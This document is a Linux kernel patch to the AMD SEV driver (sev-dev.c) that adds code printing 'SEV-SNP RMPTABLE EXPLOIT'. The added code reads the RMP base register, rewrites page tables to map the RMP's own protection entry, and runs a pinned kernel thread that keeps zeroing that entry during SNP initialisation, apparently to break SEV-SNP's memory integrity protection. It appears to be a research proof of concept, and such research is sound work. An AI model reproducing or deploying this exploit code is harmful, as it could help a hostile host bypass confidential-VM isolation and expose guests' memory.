@@ -1,0 +1,163 @@
+diff --git a/drivers/crypto/ccp/sev-dev.c b/drivers/crypto/ccp/sev-dev.c
+index 9f5ccc1720cb..af9ac54dfff3 100644
+--- a/drivers/crypto/ccp/sev-dev.c
++++ b/drivers/crypto/ccp/sev-dev.c
+@@ -1103,6 +1103,120 @@ static int snp_filter_reserved_mem_regions(struct resource *rs, void *arg)
+ 	return 0;
+ }
+ 
++atomic_t sync_value_thread_snp = ATOMIC_INIT(0);
++static u64 rmp_base_address_msr;
++
++#define PAGE_PRESENT 0x1
++#define PAGE_RW 0x2
++#define PAGE_USER 0x4
++#define NX_BIT (0x1ULL << 63)
++#define PAGE_SIZE_4K 4096
++
++#define PCD_BIT (0x1ULL << 4)
++
++static inline unsigned long read_cr3(void) {
++    unsigned long cr3;
++    asm volatile("mov %%cr3, %0" : "=r"(cr3));
++    return cr3;
++}
++
++static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr) {
++    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
++    unsigned long index5, index4, index3, index2, index1;
++    
++    // Get the base of PML5
++    pml5 = (unsigned long *)phys_to_virt(read_cr3() & ~0xFFFull);
++	
++    // Compute indices for the 5-level page table
++    index5 = (virt_addr >> 48) & 0x1FF;
++    index4 = (virt_addr >> 39) & 0x1FF;
++    index3 = (virt_addr >> 30) & 0x1FF;
++    index2 = (virt_addr >> 21) & 0x1FF;
++    index1 = (virt_addr >> 12) & 0x1FF;
++
++    //pr_info("pml5 = %lx\n", (unsigned long)pml5);
++    // Walk the 5-level paging hierarchy, allocating new tables if necessary
++    if (!pml5[index5]) {
++        pml5[index5] = virt_to_phys((void *)__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
++    }
++    //pr_info("pl5[index5] = %lx\n", pml5[index5]);
++    pml4 = (unsigned long *)(unsigned long)phys_to_virt(pml5[index5] & PAGE_MASK);
++    //pr_info("pml4 = %lx\n", (unsigned long)pml4);
++    if (!pml4[index4]) {
++        pml4[index4] = virt_to_phys((void *)__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
++    }
++    //pr_info("pl4[index4] = %lx\n", pml4[index4]);
++    pdp = (unsigned long *)((unsigned long)phys_to_virt(pml4[index4]) & PAGE_MASK);
++    //pr_info("pdp = %lx\n", (unsigned long)pdp);
++    if (!pdp[index3]) {
++        pdp[index3] = virt_to_phys((void *)__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
++    }
++    //pr_info("pdp[index3] = %lx\n", pdp[index3]);
++    pd = (unsigned long *)((unsigned long)phys_to_virt(pdp[index3]) & PAGE_MASK);
++    //pr_info("pd = %lx\n", (unsigned long)pd);
++    if (!pd[index2]) {
++        pd[index2] = virt_to_phys((void *)__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
++    }
++    //pr_info("pd[index2] = %lx\n", pd[index2]);
++    pt = (unsigned long *)((unsigned long)phys_to_virt(pd[index2]) & PAGE_MASK);
++    //pr_info("pt = %lx\n", (unsigned long)pt);
++    if (!pt[index1]) {
++        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | NX_BIT;
++    }else {
++		pr_info("OVERWRITING PT INDEX");
++        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | NX_BIT;
++	}
++    //pr_info("pt[index1] = %lx\n", pt[index1]);
++
++    // Flush TLB
++    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
++}
++
++static int thread_fn(void *data){
++	unsigned int cpu = smp_processor_id();
++	unsigned long flags;
++
++	pr_info("RMP Base MSR is 0x%llx\n", rmp_base_address_msr);
++    pr_info("Kernel thread running on CPU %u\n", cpu);
++    uint64_t rmp_actual_start = rmp_base_address_msr+0x4000;
++	
++	// RMP Entry Address = RMP_BASE + 0x4000 + X>>8
++	u64 mapped_address = rmp_actual_start + (rmp_base_address_msr >> 8);
++
++	u64 self_protect_rmp = ((rmp_actual_start) << 8);
++	self_protect_rmp /=255;
++	// each entry is 16 bytes so shift by 4 which is equal to 16
++	u64 self_protect_rmp_idx = (self_protect_rmp & 0xFFFull) >> 3;
++	self_protect_rmp &= ~0xFFFull;
++
++	pr_info("RMP: self protect rmp entry is at %llx",self_protect_rmp);
++	pr_info("RMP: self protect rmp entry index is at %llx",self_protect_rmp_idx);
++	pr_info("RMP: mapped phys addr %llx to virt addr %lx",mapped_address,0xfffffffffff00000);
++
++	map_physical_to_virtual(self_protect_rmp,0xfffffffffffA0000);
++	
++	uint64_t *self_protect_rmp_mapping = (uint64_t *)0xfffffffffffA0000;
++    
++	atomic_set(&sync_value_thread_snp,1);
++	local_irq_save(flags);
++	WRITE_ONCE(self_protect_rmp_mapping[self_protect_rmp_idx],0x0);
++	while (!kthread_should_stop()){
++		if(READ_ONCE(self_protect_rmp_mapping[self_protect_rmp_idx])){
++			WRITE_ONCE(self_protect_rmp_mapping[self_protect_rmp_idx],0x0);
++		}
++	}
++	local_irq_restore(flags);
++
++	// add additional wait in case there is an exception
++	// otherwise master will kill non existent process
++	while (!kthread_should_stop()){}
++
++   	pr_info("RMP Self Protect End value: 0x%llx\n", self_protect_rmp_mapping[self_protect_rmp_idx]);
++    pr_info("Kernel thread stopping on CPU %u\n", smp_processor_id());
++    return 0;
++}
++
++
+ static int __sev_snp_init_locked(int *error)
+ {
+ 	struct psp_device *psp = psp_master;
+@@ -1185,13 +1299,37 @@ static int __sev_snp_init_locked(int *error)
+ 	 */
+ 	wbinvd_on_all_cpus();
+ 
++	pr_info("SEV-SNP RMPTABLE EXPLOIT ...\n");
++	rdmsrl(MSR_AMD64_RMP_BASE, rmp_base_address_msr);
++	pr_info("RMP Base MSR is 0x%llx\n", rmp_base_address_msr);
++#if 1
++	struct task_struct *thread = kthread_create(thread_fn, NULL, "fetch_rmp_stuff");
++    if (IS_ERR(thread)) {
++        pr_err("Failed to create thread\n");
++        return PTR_ERR(thread);
++    }
++	kthread_bind(thread, 31); // Pin thread to CPU 31
++    wake_up_process(thread);
++	pr_info("Kernel thread created\n");
++
++	while(atomic_read(&sync_value_thread_snp) == 0){
++	}
++#endif
++
++	uint64_t start = ktime_get_ns();	
+ 	rc = __sev_do_cmd_locked(cmd, arg, error);
++	uint64_t end = ktime_get_ns();	
+ 	if (rc) {
+ 		dev_err(sev->dev, "SEV-SNP: %s failed rc %d, error %#x\n",
+ 			cmd == SEV_CMD_SNP_INIT_EX ? "SNP_INIT_EX" : "SNP_INIT",
+ 			rc, *error);
+ 		return rc;
+ 	}
++#if 1
++	kthread_stop(thread);
++#endif
++	pr_info("SEV-SNP init took %llu ns\n",end-start);
++
+ 
+ 	/* Prepare for first SNP guest launch after INIT. */
+ 	wbinvd_on_all_cpus();
